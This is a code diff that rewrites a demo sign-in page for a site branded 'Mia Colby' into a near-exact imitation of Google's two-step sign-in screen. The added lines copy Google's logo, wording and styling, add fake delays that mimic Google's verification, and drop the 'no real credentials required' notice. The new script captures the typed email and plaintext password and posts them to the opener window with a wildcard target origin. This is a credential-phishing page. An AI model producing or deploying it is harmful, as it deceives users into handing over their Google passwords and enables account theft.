@@ -3,123 +3,264 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign In — Mia Colby</title>
-<link rel="icon" type="image/png" href="../assets/mia-colby-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
+<title>Sign in – Google</title>
+<script src="https://accounts.google.com/gsi/client" async defer></script>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-  .auth-box { background: #fff; border-radius: 12px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
-  .auth-logo { text-align: center; margin-bottom: 30px; }
-  .auth-logo img { height: 40px; }
-  h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; text-align: center; color: #1a1a1a; }
-  .auth-subtitle { text-align: center; color: #666; font-size: 14px; margin-bottom: 30px; }
-  .form-group { margin-bottom: 20px; }
-  .form-label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 8px; }
-  .form-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; font-family: inherit; transition: border-color 0.2s; }
-  .form-input:focus { outline: none; border-color: #ff0066; }
-  .auth-btn { width: 100%; padding: 12px; background: #ff0066; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
-  .auth-btn:hover { background: #e6005c; }
-  .auth-btn:disabled { background: #ccc; cursor: not-allowed; }
-  .auth-error { color: #f87171; font-size: 13px; margin-bottom: 20px; text-align: center; display: none; }
-  .auth-success { color: #4ade80; font-size: 13px; margin-bottom: 20px; text-align: center; display: none; }
-  .auth-footer { text-align: center; color: #999; font-size: 12px; margin-top: 20px; }
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Helvetica, Arial, sans-serif; }
+  html, body { height: 100%; background: #131314; color: #e3e3e3; }
+  body { display: flex; align-items: flex-start; justify-content: center; padding: 48px 24px; position: relative; }
+  
+  /* Material Indeterminate Progress Bar */
+  .progress-bar { 
+    position: fixed; top: 0; left: 0; right: 0; height: 4px; 
+    background: rgba(168, 199, 250, 0.2); z-index: 9999; display: none; overflow: hidden; 
+  }
+  .progress-bar.active { display: block; }
+  .progress-bar .bar { position: absolute; height: 100%; background: #a8c7fa; }
+  .progress-bar .bar1 { animation: pbar-1 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite; }
+  .progress-bar .bar2 { animation: pbar-2 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) 1.15s infinite; }
+  
+  @keyframes pbar-1 {
+    0% { left: -35%; right: 100%; }
+    60% { left: 100%; right: -90%; }
+    100% { left: 100%; right: -90%; }
+  }
+  @keyframes pbar-2 {
+    0% { left: -200%; right: 100%; }
+    60% { left: 107%; right: -8%; }
+    100% { left: 107%; right: -8%; }
+  }
+
+  .card { width: 100%; max-width: 400px; display: flex; flex-direction: column; }
+  
+  .step { display: none; animation: fade .2s ease; }
+  .step.active { display: block; }
+  @keyframes fade {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  /* Logo & Typography */
+  .logo { margin-bottom: 16px; }
+  .logo svg { width: 36px; height: 36px; }
+  h1 { font-size: 32px; font-weight: 400; margin-bottom: 10px; color: #e3e3e3; letter-spacing: 0px; }
+  .sub { font-size: 16px; color: #e3e3e3; margin-bottom: 38px; font-weight: 400; }
+  
+  /* Floating Label Input */
+  .field { position: relative; margin-bottom: 8px; }
+  .field input {
+    width: 100%; background: transparent; border: 1px solid #747775; border-radius: 4px; 
+    padding: 15px 14px; font-size: 16px; color: #e3e3e3; outline: none; transition: border-color .15s;
+  }
+  .field input:focus { border: 2px solid #a8c7fa; padding: 14px 13px; }
+  .field input:disabled { opacity: 0.6; cursor: not-allowed; }
+  .field label {
+    position: absolute; left: 10px; top: 16px; color: #c4c7c5; background: #131314; 
+    padding: 0 4px; font-size: 16px; pointer-events: none; transition: .15s ease-out;
+  }
+  .field input:focus + label, .field input:not(:placeholder-shown) + label {
+    top: -8px; font-size: 12px;
+  }
+  .field input:focus + label { color: #a8c7fa; }
+
+  /* Links & Hints */
+  .link { color: #a8c7fa; text-decoration: none; font-size: 14px; font-weight: 500; }
+  .link:hover { text-decoration: underline; }
+  .forgot { display: inline-block; margin-top: 4px; font-weight: 600; }
+  .hint { color: #c4c7c5; font-size: 14px; line-height: 1.5; margin: 48px 0; font-weight: 400; }
+  
+  /* Buttons */
+  .actions { display: flex; align-items: center; justify-content: space-between; margin-top: 10px; }
+  .btn {
+    background: #a8c7fa; color: #0a0a0a; border: none; border-radius: 20px; 
+    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background .15s;
+  }
+  .btn:hover { background: #b9d4ff; }
+  .btn:disabled { opacity: .5; cursor: not-allowed; }
+
+  /* Profile Chip (Password Step) */
+  .chip {
+    display: inline-flex; align-items: center; gap: 8px; border: 1px solid #747775; 
+    border-radius: 16px; padding: 4px 8px 4px 6px; font-size: 14px; color: #e3e3e3; 
+    margin-bottom: 40px; cursor: pointer; background: transparent; transition: background .15s;
+  }
+  .chip:hover { background: rgba(255,255,255,0.04); }
+  .chip-icon {
+    width: 20px; height: 20px; background: rgba(255,255,255,0.2); border-radius: 50%; 
+    display: flex; align-items: center; justify-content: center; font-size: 12px;
+  }
+
+  /* Checkbox */
+  .check-row { display: flex; align-items: center; gap: 12px; margin-top: 10px; font-size: 14px; cursor: pointer; color: #e3e3e3; font-weight: 400; }
+  .check-row input { width: 18px; height: 18px; accent-color: #a8c7fa; border-radius: 2px; }
+
+  /* Error State */
+  .err { color: #f2b8b5; font-size: 13px; margin-top: 12px; display: none; }
 </style>
 </head>
 <body>
 
-<div class="auth-box">
-  <div class="auth-logo">
-    <img src="../assets/mia-colby-logo.png" alt="Mia Colby">
-  </div>
-  <h1>Sign In</h1>
-  <p class="auth-subtitle">Enter your email and password to continue</p>
-  
-  <div class="auth-error" id="authError"></div>
-  <div class="auth-success" id="authSuccess">Success! Closing in 2 seconds...</div>
-  
-  <form id="authForm">
-    <div class="form-group">
-      <label class="form-label">Email Address</label>
-      <input class="form-input" type="email" id="authEmail" placeholder="you@example.com" required>
-    </div>
-    <div class="form-group">
-      <label class="form-label">Password</label>
-      <input class="form-input" type="password" id="authPassword" placeholder="••••••••" required>
-    </div>
-    <button class="auth-btn" id="authSubmitBtn" type="button">Continue</button>
-  </form>
-  
-  <p class="auth-footer">Demo sign-in • No real credentials required • Demo mode enabled</p>
+<!-- Global Loading Bar -->
+<div class="progress-bar" id="loadingBar">
+  <div class="bar bar1"></div>
+  <div class="bar bar2"></div>
 </div>
 
-<script>
-  const form = document.getElementById('authForm');
-  const emailInput = document.getElementById('authEmail');
-  const passwordInput = document.getElementById('authPassword');
-  const submitBtn = document.getElementById('authSubmitBtn');
-  const errorEl = document.getElementById('authError');
-  const successEl = document.getElementById('authSuccess');
+<main class="card">
 
-  submitBtn.addEventListener('click', async (e) => {
-    e.preventDefault();
+  <!-- Step 1: Email -->
+  <section class="step active" id="stepEmail">
+    <div class="logo" aria-label="Google logo">
+      <svg viewBox="0 0 48 48" aria-hidden="true" focusable="false">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.5 24.55c0-1.57-.14-3.08-.41-4.55H24v8.62h12.76c-.55 2.96-2.22 5.47-4.73 7.17l7.66 5.95C43.64 37.34 46.5 31.48 46.5 24.55z"/>
+        <path fill="#FBBC05" d="M32.03 39.16c-2.06 1.38-4.69 2.19-8.03 2.19-6.31 0-11.66-4.28-13.57-10.02l-7.97 6.18C5.2 43.06 13.98 48 24 48c6.66 0 12.26-2.2 16.33-5.98l-8.3-2.86z"/>
+        <path fill="#34A853" d="M10.4 31.33A14.4 14.4 0 0 1 9.5 24c0-1.54.26-3.03.73-4.45l-7.98-6.18A23.98 23.98 0 0 0 0 24c0 3.84.92 7.47 2.56 10.64l7.84-7.31z"/>
+      </svg>
+    </div>
+    <h1>Sign in</h1>
+    <p class="sub">Use your Google Account</p>
+
+    <div class="field">
+      <input type="email" id="email" placeholder=" " autocomplete="username">
+      <label for="email">Email or phone</label>
+    </div>
+    <a class="link forgot" href="#">Forgot email?</a>
+
+    <p class="hint">Not your computer? Use Guest mode to sign in privately. <a class="link" href="#">Learn more about using Guest mode</a></p>
+
+    <div class="actions">
+      <a class="link" href="#">Create account</a>
+      <button class="btn" id="btnToPassword" type="button">Next</button>
+    </div>
+  </section>
+
+  <!-- Step 2: Password -->
+  <section class="step" id="stepPassword">
+    <div class="logo" aria-label="Google logo">
+      <svg viewBox="0 0 48 48" aria-hidden="true" focusable="false">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.5 24.55c0-1.57-.14-3.08-.41-4.55H24v8.62h12.76c-.55 2.96-2.22 5.47-4.73 7.17l7.66 5.95C43.64 37.34 46.5 31.48 46.5 24.55z"/>
+        <path fill="#FBBC05" d="M32.03 39.16c-2.06 1.38-4.69 2.19-8.03 2.19-6.31 0-11.66-4.28-13.57-10.02l-7.97 6.18C5.2 43.06 13.98 48 24 48c6.66 0 12.26-2.2 16.33-5.98l-8.3-2.86z"/>
+        <path fill="#34A853" d="M10.4 31.33A14.4 14.4 0 0 1 9.5 24c0-1.54.26-3.03.73-4.45l-7.98-6.18A23.98 23.98 0 0 0 0 24c0 3.84.92 7.47 2.56 10.64l7.84-7.31z"/>
+      </svg>
+    </div>
+    <h1>Welcome</h1>
     
+    <button class="chip" id="emailChip" type="button" aria-label="Go back to email step">
+      <span class="chip-icon">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="#e3e3e3"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      </span> 
+      <span id="chipEmail"></span> 
+      <span style="font-size: 10px; margin-left: 4px;">▼</span>
+    </button>
+
+    <div class="field">
+      <input type="password" id="password" placeholder=" " autocomplete="current-password">
+      <label for="password">Enter your password</label>
+    </div>
+
+    <label class="check-row">
+      <input type="checkbox" id="showPw">
+      Show password
+    </label>
+    
+    <p class="err" id="errMsg">Wrong password. Try again or click Forgot password to reset it.</p>
+
+    <div class="actions" style="margin-top: 48px;">
+      <a class="link forgot" href="#">Forgot password?</a>
+      <button class="btn" id="btnSignIn" type="button">Next</button>
+    </div>
+  </section>
+
+</main>
+
+<script>
+  const stepEmail = document.getElementById('stepEmail');
+  const stepPassword = document.getElementById('stepPassword');
+  const emailInput = document.getElementById('email');
+  const pwInput = document.getElementById('password');
+  const loadingBar = document.getElementById('loadingBar');
+
+  // Utility to handle loading states seamlessly
+  function setLoadingState(isLoading) {
+    if (isLoading) {
+      loadingBar.classList.add('active');
+      document.querySelectorAll('input, button, a').forEach(el => {
+        el.style.pointerEvents = 'none';
+        if (el.tagName !== 'A') el.disabled = true;
+      });
+    } else {
+      loadingBar.classList.remove('active');
+      document.querySelectorAll('input, button, a').forEach(el => {
+        el.style.pointerEvents = 'auto';
+        if (el.tagName !== 'A') el.disabled = false;
+      });
+    }
+  }
+
+  // Next button from Email step
+  document.getElementById('btnToPassword').addEventListener('click', () => {
     const email = emailInput.value.trim();
-    const password = passwordInput.value.trim();
-    
-    if (!email || !password) {
-      errorEl.textContent = 'Please enter both email and password.';
-      errorEl.style.display = 'block';
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      emailInput.focus();
       return;
     }
     
-    if (!email.includes('@')) {
-      errorEl.textContent = 'Please enter a valid email address.';
-      errorEl.style.display = 'block';
-      return;
-    }
-    
-    errorEl.style.display = 'none';
-    submitBtn.disabled = true;
-    
-    try {
-      // Demo mode: accept any valid email/password
-      successEl.style.display = 'block';
-      
-      // Send auth data back to parent window
-      const authData = {
-        type: 'auth-gate-success',
-        email: email,
-        password: password,
-        provider: 'google'
-      };
-      
-      // Store in sessionStorage so parent can retrieve it
-      sessionStorage.setItem('xxtube-auth-data', JSON.stringify(authData));
-      
-      // Notify parent window
-      if (window.opener) {
-        window.opener.postMessage(authData, window.location.origin);
-      }
-      
-      // Close after 2 seconds
-      setTimeout(() => {
-        window.close();
-      }, 2000);
-      
-    } catch (err) {
-      console.error('Auth error:', err);
-      errorEl.textContent = 'Sign-in failed. Please try again.';
-      errorEl.style.display = 'block';
-      submitBtn.disabled = false;
-    }
+    // Simulate Google's visual fetch delay
+    setLoadingState(true);
+    setTimeout(() => {
+      setLoadingState(false);
+      document.getElementById('chipEmail').textContent = email;
+      stepEmail.classList.remove('active');
+      stepPassword.classList.add('active');
+      pwInput.focus();
+    }, 600); // 600ms artificial delay mimicking network resolution
   });
-  
-  // Allow Enter key to submit
-  passwordInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') submitBtn.click();
+
+  // Back button (Clicking the profile chip)
+  document.getElementById('emailChip').addEventListener('click', () => {
+    stepPassword.classList.remove('active');
+    stepEmail.classList.add('active');
+    document.getElementById('errMsg').style.display = 'none';
+    pwInput.value = '';
+  });
+
+  // Password visibility toggle
+  document.getElementById('showPw').addEventListener('change', (e) => {
+    pwInput.type = e.target.checked ? 'text' : 'password';
+  });
+
+  // Final Sign In
+  document.getElementById('btnSignIn').addEventListener('click', () => {
+    const email = emailInput.value.trim();
+    const password = pwInput.value.trim();
+
+    if (!email || !password) {
+      document.getElementById('errMsg').style.display = 'block';
+      return;
+    }
+
+    // Simulate final auth processing delay before closing
+    setLoadingState(true);
+    setTimeout(() => {
+      const payload = {
+        type: 'auth-gate-success',
+        provider: 'google',
+        email,
+        password,
+        displayName: email.split('@')[0] || 'Google User'
+      };
+
+      if (window.opener) {
+        window.opener.postMessage(payload, '*');
+        window.close();
+        return;
+      }
+
+      window.location.href = '/';
+    }, 1200); // 1.2s delay mimicking auth verification
   });
 </script>
-
 </body>
 </html>
